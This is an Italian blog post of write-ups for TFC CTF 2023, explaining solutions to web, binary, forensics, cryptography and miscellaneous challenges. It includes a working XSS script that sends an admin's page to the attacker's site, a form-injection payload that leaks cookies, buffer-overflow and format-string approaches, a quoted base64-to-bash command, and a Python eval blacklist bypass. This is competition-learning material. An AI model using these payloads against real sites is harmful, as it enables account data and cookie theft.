---
title: "TFC CTF 2023"
date: 2023-08-20T00:00:00+00:00
# weight: 1
# aliases: ["/first"]
tags: ["tfcctf", "ctf", "binary", "crypto", "web", "tfcctf2023"]
author: "AlBovo"
# author: ["Me", "You"] # multiple authors
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "Alcune writeup della TFC CTF 2023."
canonicalURL: "https://albovo.github.io/it/ctf/"
disableHLJS: false
disableShare: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/AlBovo/CTF-Writeups" # image path/url
    alt: "TFC CTF 2023" # alt text
    caption: "Alcune writeup della TFC CTF 2023." # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/AlBovo/AlBovo.github.io/blob/main/content/it"
    Text: "Suggerisci modifiche" # edit text
    appendFilePath: true # to append file path to Edit link
---

# TFC CTF 2023
![tfc ctf logo](/images/tfc.png)

## Web 🌐
### Baby Ducky Notes
All'apparenza, questa challenge sembrava un semplice sito per la condivisione di note, ma un rapido sguardo al codice sorgente ha svelato come leggere la flag. 
Infatti, il file `database.db` includeva una query per inizializzare la tabella delle note, configurata nel seguente modo:
```py
query(con, f''' 
INSERT INTO posts (
    user_id,
    title,
    content,
    hidden
    ) VALUES (
        1,
        'Here is a ducky flag!',
        '{os.environ.get("FLAG")}',
        0  
);
''')
```
Questo significava che chiaramente la flag non era nascosta e che il metodo più semplice per trovarla era effettuare una richiesta GET all'URL `http://challs.tfcctf.com:port/posts/view/admin`, dove la flag era visibile.

### Baby Ducky Notes: Revenge
Questa challenge risultava un po' più elaborata rispetto alla precedente, poiché la flag era nascosta. L'unico modo per leggerla era far sì che l'admin la visualizzasse, oppure ottenere il suo cookie, che però era protetto da HttpOnly.  
Analizzando il codice sorgente, ho individuato questo frammento nel template della pagina dei post:
```html
<ul class="posts_ul">
    {% for post in posts %}
    <li>
        <div class="blog_post">
            <div class="container_copy">
                <h1> {{post.get('title')}} </h1>
                <h3> {{post.get('username')}} </h3>
                <p> {{post.get('content') | safe}} </p>
            </div>
        </div>
    </li>
    {% endfor %} 
</ul>
```
Il contenuto veniva renderizzato senza alcuna sanitizzazione, il che mi ha permesso di eseguire un attacco XSS con questo payload:
```js
<script>
async function attack(){
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "/posts/view/admin", true);
    xhr.responseType = "text";
    xhr.onload = () => {
        window.location.href = "{input('Enter the url of your site: ')}?html=" + btoa(xhr.responseText.toString());
    };
    await xhr.send(null);
}
attack();
</script>
```
Eseguendo questo script, l'admin avrebbe visualizzato le proprie note (inclusa la flag) e inviato l'intero HTML, codificato in base64, al mio sito. Successivamente, avrei potuto decodificarlo per estrarre la flag.

### Cookie Store
Questa challenge mi ha fatto impazzire per un po’ perché non riuscivo a far girare il codice JavaScript della pagina (fondamentale per l'exploit) a causa di un errore nella funzione `setHTML`, la quale funzionava solo in ambiente `localhost` o su connessioni `https`.  
Successivamente ho trovato un modo per far girare Docker come `localhost` (inizialmente usava l'IP locale 172.17.x.x) e, nonostante il tempo speso per risolvere il problema, la challenge si è rivelata interessante. Infatti, il sito stampava le "note" utilizzando un metodo di ordinamento delle colonne vulnerabile:
```js
const urlParams = new URLSearchParams(window.location.search);
const fields = urlParams.get('fields');

let form_html = '';
let fields_list = [];
if (fields) {
    fields_list = fields.split(',');
    fields_list.forEach(element => {
        form_html += `<div class="mb-4">
            <label for="${element}" ... >${element}</label>
            <input type="text" name="${element}" id="${element}" ...>
        </div>`;
    });
}
// This will sanitize the input
document.querySelector('#form_builder').setHTML(form_html);

...
```
Questo codice inserisce l’input direttamente nel codice HTML senza controlli, rimuovendo solo script o metodi JavaScript come `onerror` o `onload` prima di scriverlo nella pagina.  
La vulnerabilità risiede nel fatto che, inviando questo payload come campo:
```html
"><input type="submit" formaction="our site" id="pwned"><label name="
```
si può reindirizzare l’output del form (contenente il cookie store) verso il proprio sito, consentendo di leggere la flag scritta dall’admin nel campo titolo.

### MCTree
Questa challenge era molto semplice ma, a causa di problemi personali (e una cospicua skill issue mia, pardon ZenHack) non sono riuscito a capire la vulnerabilità durante la CTF. Il sito non forniva alcun codice sorgente da scaricare: bastava registrarsi, fare login e, se dopo il login si aveva l’username admin, si poteva ottenere la flag.  
Dopo alcuni tentativi ho notato che il sito rimuoveva sempre caratteri come `{}<>[]'"`. Quindi, la strategia era quella di inviare un username del tipo `{admin` in modo che la richiesta venisse accettata (poiché il nome risultava diverso da `admin`), ma dopo la sanitizzazione il nome diventava comunque `admin`. E il gioco era fatto!

## Binary 🐧
### Diary
Questa challenge era davvero interessante e semplice, grazie alla presenza di segmenti RWX, l'assenza di PIE e la mancanza di canary.
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x400000)
RWX:      Has RWX segments
```
La funzione vulnerabile `vuln` leggeva 1024 caratteri in un buffer di soli 256 byte, consentendo un overflow per modificare il puntatore di ritorno:
```c
fgets((char *)&local_108,0x400,stdin);
``` 
Utilizzando `ropgadgets` per individuare istruzioni utili, ho trovato il seguente comando:
```nasm
call rax
```
Così, ho realizzato uno shellcode tramite il modulo `shellcraft` di pwntools e ho cambiato il puntatore di ritorno per eseguirlo.

### Shello-World
Questa challenge è simile a Diary, ma qui non è possibile eseguire un buffer overflow, perché la funzione `vuln` è la seguente:
```C
fgets((char *)&local_108,0x100,stdin);
printf("Hello, ");
printf((char *)&local_108);
putchar(10); // (chr)(10) == '\n' => true
```
Anche se diversa da Diary, risulta comunque vulnerabile a causa di una format string vulnerability: il file sorgente esegue un `printf` senza specificare una stringa di formato, il che permette di utilizzare la funzione `fmtstr_payload` di pwntools per scrivere un payload che sostituisce l'indirizzo della funzione `exit` nel GOT con quello della funzione `win`, aprendo così una shell sulla macchina remota.

### Random
A prima vista questa challenge potrebbe sembrare non vulnerabile, ma osservando la chiamata alla funzione `sran` nel codice decompilato del tool, si nota una riga simile a:
```c
srand(time(NULL));
```
Questa operazione può essere facilmente replicata in Python usando la libreria `ctypes`.  
L’exploit consiste nel ricreare tutti i numeri generati dalla funzione random (seedata con l’ora corrente) mediante uno script Python e poi inviarli al container per ottenere la flag.

## Forensics
### List
Questa challenge forniva un file contenente numerose comunicazioni HTTP, tutte con status code `404` o `403` quando il client tentava di accedere a directory "casuali".
Si trattava chiaramente di un bruteforce delle URI, eseguito con tool come `gobuster` o `dirsearch`.  
Filtrando le risposte e rimuovendo quelle con status code `404` o `403`, sono emersi alcuni pacchetti che sembravano risposte a comandi di reverse shell:
```sh
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Questo indicava che da qualche parte nel file era stato eseguito un comando dall'attaccante.  
Dopo un po’ di analisi, ho notato numerose richieste HTTP POST, tutte della stessa lunghezza (756 byte) e con payload identico:
```sh
echo "ZmluZCAvaG9tZS9jdGYgLXR5cGUgZiAtbmFtZSAifSIgMj4vZGV2L251bGw=" | base64 -d | bash
```
Questo comando bash, codificato in base64, decodificava in:
```sh
find /home/ctf -type f -name "T" 2>/dev/null
```
Successivamente, in un altro pacchetto, lo stesso payload (con una leggera variazione) veniva usato:
```sh
find /home/ctf -type f -name "F" 2>/dev/null
```
La flag era quindi frammentata in diversi comandi, e bastava scrivere uno script per unire i pezzi tramite regex.

### Some Traffic
Questa challenge richiedeva più tempo perché il file conteneva anche normali pacchetti HTTP relativi all’upload di tre immagini su un sito. 
Dopo aver estratto tutte le immagini, ho cercato eventuali dati nascosti. La prima immagine, infatti, presentava tre colonne di pixel verdi che nascondevano informazioni:
```py
(1, 84, 1)
(1, 70, 1)
(1, 67, 1)
(1, 67, 1)
(1, 84, 1)
(1, 70, 1)
(1, 123, 1)
```
Analizzando i valori RGB di ogni pixel, si notava che il valore di Red era sempre 1 (così come quello di Blue), mentre il valore di Green corrispondeva a un carattere ASCII. In sostanza, questi valori rappresentavano il formato della flag `TFCCTF{` nascosto nei pixel.

### MCTeenX
Questa challenge era particolarmente interessante perché forniva un file zip protetto da password, che non era possibile crackare con un dizionario.  
All'interno c'era un solo file, uno script `.sh` che normalmente iniziava con:
```sh
#!/bin/sh
```
Conoscendo parte del contenuto, ho potuto tentare un Plaintext Attack con `bkcrack` eseguendo:
```sh
bkcrack -C src.zip -c script.sh -p temp_file.sh
```
(dove `temp_file.sh` conteneva il plaintext noto).  
Fortunatamente, lo strumento è riuscito a estrarre il file `script.sh`, che sembrava contenere semplicemente un'istruzione echo di un testo codificato in base64, indirizzato al file `red.png`.  
La prima idea è stata quella di analizzare il contenuto con `zsteg`, che ha evidenziato diverse anomalie. Tra queste, un testo esadecimale che, se decodificato, appariva come una sequenza di byte casuali:
```
030a111418142c783b39380d397c0d25293324231c66220d367d3c23133c6713343e343b3931
```
Dopo vari tentativi, ho provato ad applicare una XOR con il formato della flag `TFCCTF{`, ottenendo una stringa del tipo `WLRWLRW`.  
Ripetendo la stringa fino a coprire tutta la lunghezza del testo esadecimale e applicando nuovamente la XOR, la flag è risultata chiara.

## Cryptography 🔒
### Dizzy
Dizzy è stata la prima challenge della sezione crypto e produceva il seguente output:
```
T4 l16 _36 510 _27 s26 _11 320 414 {6 }39 C2 T0 m28 317 y35 d31 F1 m22 g19 d38 z34 423 l15 329 c12 ;37 19 h13 _30 F5 t7 C3 325 z33 _21 h8 n18 132 k24
```
Dopo aver riflettuto sul significato, ho notato che alcuni gruppi (come `T0 F1 C2 C3 T4 F5 {6`) erano particolarmente sospetti.  
Alla fine ho capito che si trattava di coppie nel formato `carattere:posizione` mescolate in maniera casuale. Con uno script (vedi la funzione `normal_solution` nello script di soluzione) sono riuscito a ricostruire l'intera flag.

### Mayday
Anche questa challenge produceva un output che, a prima vista, sembrava il NATO alphabet:
```
Whiskey Hotel Four Tango Dash Alpha Romeo Three Dash Yankee Oscar Uniform Dash Sierra One November Kilo India November Golf Dash Four Bravo Zero Uniform Seven
```
La soluzione consisteva semplicemente nel mappare ogni parola in un carattere (o numero) per ricostruire la flag.  
P.S. La flag era nel formato `TFCCTF{FOUND_TEXT}`

### Alien Music
Questa challenge era basata sulla pura intuizione, ma era anche la più semplice della sezione crypto. L'output era:
```
DC# C#D# C#C C#C DC# C#D# E2 C#5 CA EC# CC DE CA EB EC# D#F EF# D6 D#4 CC EC EC CC# D#E CC E4
```
Dopo un'attenta analisi, ho tentato di collegare le prime coppie al formato `TFCCTF{` ipotizzando ad esempio:
```py
ord('T') => 0x54 => {'D' : 5, 'C#' : 4}
ord('F') => 0x46 => {'C#' : 4, 'D#' : 6}
ord('C') => 0x43 => {'C#' : 4, 'C' : 3}
```
Ho quindi creato una mappatura con questo dizionario in Python:
```py
d = {
    "A": "0", "A#" : "1", "B" : "2", "C" : "3",  "C#" : "4", 
    "D": "5", "D#" : "6", "E" : "7", "F" : "8", "F#" : "9", 
    "1": "a", "2" : "b", "3" : "c", "4" : "d", "5" : "e", "6" : "f"
}
```
Dopo aver scritto uno script veloce, la flag è risultata.

### Rabid
Rabid forniva un piccolo indizio: nel messaggio era presente un extra. L'output era:
```
VEZDQ1RGe13kwdV9yNGIxZF9kMGc/IT8hPyE/IT8hPi8+Pz4/PjEyMzkwamNhcHNrZGowOTFyYW5kb21sZXR0ZXJzYW5kbnVtYmVyc3JlZWVlMmozfQ==
```
Si trattava di un messaggio codificato in base64, che includeva un prefisso codificato nel formato `TFCCTF{`. L'unico modo per ottenere il resto della flag era rimuovere il prefisso codificato e decodificare nuovamente il messaggio.

### AES CTF Tool V1
Per risolvere questa challenge, il modo più semplice è stato installare lo [strumento](https://github.com/hofill/AES-CTF-Tool) sviluppato dagli admin appositamente per la challenge ed eseguire il file `main.py`:
```
alan@ubuntu:~$ python3 main.py
[INFO] Starting initial cryptanalysis.
[INFO] Starting initial cryptanalysis.
[INFO] Determining block size.
[X] Found block size: 16.
[INFO] Determining block chiper category.
[X] Found block cipher category: ECB_CBC.
[INFO] Starting fingerprinting.
[INFO] Determining block cipher mode.
[X] Found block cipher mode: ECB.
======= Probabilities =======
ECB: 100%
CBC: 0%
CFB: 0%
OFB: 0%
CTR: 0%
=============================
[INFO] ECB/CBC detected. Determining padding method.
[X] Found padding method: Block.
[INFO] Fingerprinting complete.
Would you like to perform a Chosen Plaintext Attack? (Y/n) Y
Y

Optimize search space for printable ascii? (Y/n) Y
Y

[INFO] Starting Chosen Plaintext Attack.
Offset: 8 bytes
Block number: 7
Found: T
Found: TF
Found: TFC
Found: TFCC
Found: TFCCT
Found: TFCCTF
Found: TFCCTF{
...
```

### AES CTF Tool V2
Questa challenge era identica alla precedente, ma richiedeva in più di fornire un ciphertext crittografato da decriptare:
```
alan@ubuntu:~$ python3 main.py
[INFO] Starting initial cryptanalysis.
[INFO] Starting initial cryptanalysis.
[INFO] Determining block size.
[X] Found block size: 16.
[INFO] Determining block chiper category.
[X] Found block cipher category: ECB_CBC.
[INFO] Starting fingerprinting.
[INFO] Determining block cipher mode.
[X] Found block cipher mode: CBC.
======= Probabilities =======
CBC: 100%
ECB: 0%
CFB: 0%
OFB: 0%
CTR: 0%
=============================
[INFO] ECB/CBC detected. Determining padding method.
[X] Found padding method: Block+.
[INFO] Checking if the IV is reused for each encryption.
[INFO] Reuses IV: True.
[INFO] Fingerprinting complete.
Would you like to perform a Padding Oracle Attack? (Y/n) Y
Y

[INFO] Starting Padding Oracle Attack.
Enter the ciphertext to decrypt (in hexadecimal): 4a1e62c51fd9e5f79919...
Found byte: 84
Intermediate value: 85
Found byte: 247
Intermediate value: 245
Found byte: 214
Intermediate value: 213
Found byte: 159
Intermediate value: 155
...
```

## Miscellaneous ⚙️
### Discord Shenanigans V3
Questa challenge era puramente un trolling, perché la flag era nascosta nel logo del bot Discord del server CTF.

### My First Calculator
Non sono riuscito a risolvere questa challenge durante la CTF perché ignoravo l’esistenza di questo exploit (crediti a dp_1).  
Python è infatti un linguaggio "misterioso" che presenta strane interpetazioni nella gestione delle stringhe.  
La challenge forniva un file Python come il seguente:
```py
import sys
print("This is a calculator")
inp = input("Formula: ")
sys.stdin.close()
blacklist = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ."

if any(x in inp for x in blacklist):
    print("Nice try")
    exit()

fns = {
    "pow": pow
}
print(eval(inp, fns, fns))
```
L'exploit consisteva nell'inviare un payload "invisibile" (che bypassava la blacklist) per leggere la flag, ad esempio con:
```py
''.join(i for i in open("flag", "r"))
```
